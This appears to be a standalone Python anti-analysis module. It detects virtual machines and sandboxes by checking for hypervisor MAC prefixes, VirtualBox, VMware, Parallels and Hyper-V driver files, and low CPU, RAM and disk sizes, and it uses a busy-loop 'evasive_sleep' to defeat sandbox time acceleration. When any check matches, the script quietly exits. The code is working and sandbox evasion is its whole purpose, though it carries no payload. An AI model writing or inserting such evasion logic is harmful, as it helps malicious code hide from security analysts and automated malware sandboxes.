import psutil
import sys
import re
import uuid
import time
import random
import os

MAC_PREFIXES = { 
        "VMware": ["00:50:56", "00:0C:29", "00:05:69"],
        "VirtualBox": ["08:00:27"],
        "Hyper-V": ["00:15:5D"],
        "QEMU/KVM": ["52:54:00"],
        "Parallels": ["00:1C:42"]
}

HYPERVISOR_FILES =  {
    "VirtualBox": [
        "C:\\windows\\System32\\Drivers\\VBoxMouse.sys",
        "C:\\windows\\System32\\Drivers\\VBoxGuest.sys",
        "C:\\windows\\System32\\Drivers\\VBoxSF.sys",
        "C:\\windows\\System32\\Drivers\\VBoxVideo.sys",
        "C:\\windows\\System32\\vboxdisp.dll",
        "C:\\windows\\System32\\vboxhook.dll",
        "C:\\windows\\System32\\vboxmrxnp.dll",
        "C:\\windows\\System32\\vboxogl.dll",
        "C:\\windows\\System32\\vboxoglarrayspu.dll",
        "C:\\windows\\System32\\vboxoglcrutil.dll",
        "C:\\windows\\System32\\vboxoglerrorspu.dll",
        "C:\\windows\\System32\\vboxoglfeedbackspu.dll",
        "C:\\windows\\System32\\vboxoglpackspu.dll",
        "C:\\windows\\System32\\vboxoglpassthroughspu.dll",
        "C:\\windows\\System32\\vboxservice.exe",
        "C:\\windows\\System32\\vboxtray.exe",
        "C:\\windows\\System32\\VBoxControl.exe"
    ],

    "VMware": [
        "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
        "C:\\windows\\System32\\Drivers\\vm3dgl.dll",
        "C:\\windows\\System32\\Drivers\\vmdum.dll",
        "C:\\windows\\System32\\Drivers\\vm3dver.dll",
        "C:\\windows\\System32\\Drivers\\vmtray.dll",
        "C:\\windows\\System32\\Drivers\\VMToolsHook.dll",
        "C:\\windows\\System32\\Drivers\\vmmousever.dll",
        "C:\\windows\\System32\\Drivers\\vmhgfs.dll",
        "C:\\windows\\System32\\Drivers\\vmGuestLib.dll",
        "C:\\windows\\System32\\Drivers\\VmGuestLibJava.dll",
        "C:\\windows\\System32\\Drivers\\vmhgfs.dll"
    ],
            
    "Parallels": [
        "C:\\windows\\System32\\Drivers\\prlmouse.sys",
        "C:\\windows\\System32\\Drivers\\prlvideo.sys",
        "C:\\windows\\System32\\Drivers\\prlfs.sys",
        "C:\\windows\\System32\\prlvmtoolsd.exe",
        "C:\\windows\\System32\\prlclient.exe",
        "C:\\windows\\System32\\prltools.sys",
        "C:\\windows\\System32\\parallels.iso"
    ],

    "Hyper-V": [
        "C:\\windows\\System32\\Drivers\\hvservice.sys",
        "C:\\windows\\System32\\Drivers\\vmbus.sys",
        "C:\\windows\\System32\\Drivers\\hvnetvsc.sys",
        "C:\\windows\\System32\\Drivers\\hvsocket.sys",
        "C:\\windows\\System32\\hvhostsvc.dll",
        "C:\\windows\\System32\\vhdsvc.dll",
        "C:\\windows\\System32\\vmms.exe"
    ]
} 

def evasive_sleep(seconds): 
    start = time.perf_counter()
    while time.perf_counter() - start < seconds:
        _ = sum(random.randint(1, 100) for _ in range(10000))  

def get_mac_address():
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    return mac.upper()

def check_hypervisor_mac(mac):
    for prefixes in MAC_PREFIXES.values():
        if any(mac.startswith(prefix) for prefix in prefixes):
            return True
    return False

def check_hypervisor_files():
    for files in HYPERVISOR_FILES.values():
        for file in files:
            if os.path.isfile(file):
                return True
    return False

def check_system_requirements(): 
    cpu_cores = psutil.cpu_count(logical=False)  
    ram = psutil.virtual_memory().total / (1024 ** 3)  
    disk = psutil.disk_usage('/').total / (1024 ** 3)  
    if disk < 64 or ram < 4 or cpu_cores < 2:
        return True
    return False

def check_virtualization():
    evasive_sleep(5)  
    if (
        check_hypervisor_mac(get_mac_address())
        or check_hypervisor_files()
        or check_system_requirements()
    ):
        sys.exit(0)
    
if __name__ == "__main__":
    check_virtualization()